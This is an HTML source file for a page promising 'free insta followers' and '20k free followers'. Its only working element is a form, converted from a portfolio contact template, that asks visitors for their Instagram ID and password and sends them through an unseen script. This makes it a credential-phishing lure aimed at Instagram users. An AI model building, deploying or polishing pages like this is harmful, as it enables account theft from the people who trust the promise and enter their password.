<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="made by kerala." />
    <title>free</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
        href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Inter:wght@300;400;500&display=swap"
        rel="stylesheet" />
    <link rel="stylesheet" href="style.css" />
</head>

<body>

    <!-- Noise Overlay -->
    <div class="noise" aria-hidden="true"></div>

    <!-- Navigation -->
    <nav id="navbar" class="navbar">
        <div class="nav-inner">
            <a href="#hero" class="nav-logo" id="nav-logo">for free</a>
            <ul class="nav-links" id="nav-links">

            <button class="hamburger" id="hamburger" aria-label="Toggle menu">
                <span></span><span></span><span></span>
            </button>
        </div>
    </nav>

    <!-- Mobile Menu -->
    <div class="mobile-menu" id="mobile-menu">
        <ul>


          
        </ul>
    </div>

    <!-- Hero Section -->
    <section id="hero" class="hero">
        <div class="hero-content">
            <div class="hero-badge fade-up" style="--delay: 0.1s">
                <span class="badge-dot"></span>
                
            </div>
            <p class="hero-sub fade-up" style="--delay: 0.4s">
                <strong>free insta followers</strong>
            </p>
            <div class="hero-actions fade-up" style="--delay: 0.55s">
                <a href="#work" class="btn btn-primary" id="view-work-btn">best follows web</a>
    
            </div>
            </div>
    </section>




    <!-- Contact Section -->
            <div class="contact-grid">
                <div class="contact-info reveal">
                    <div class="contact-item glass">
                        <span class="contact-icon">📧</span>
                        
                <form class="contact-form reveal glass" id="contact-form" novalidate>
                    <div class="form-group">
                        <label for="name">instagram ID</label>
                        <input type="text" id="name" name="name" placeholder="Your full name" required />
                    </div>
                   
                    <div class="form-group">
                        <label for="message">password</label>
                        <textarea id="message" name="message" rows="5" placeholder="Tell your about your dream"
                            required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary full-width" id="submit-btn">Send</button>
                    <div class="form-success" id="form-success">
                        <span>🎉</span> Message sent! I'll get back to you soon.
                    </div>
                </form>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <div class="footer-inner">
                <span class="footer-logo">20k free followers</span>
                <p>© 2026.for your instagram free followers </p>
                <div class="footer-links">
                    <a href="#hero">Top</a>
    
                  
                </div>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>

</html>
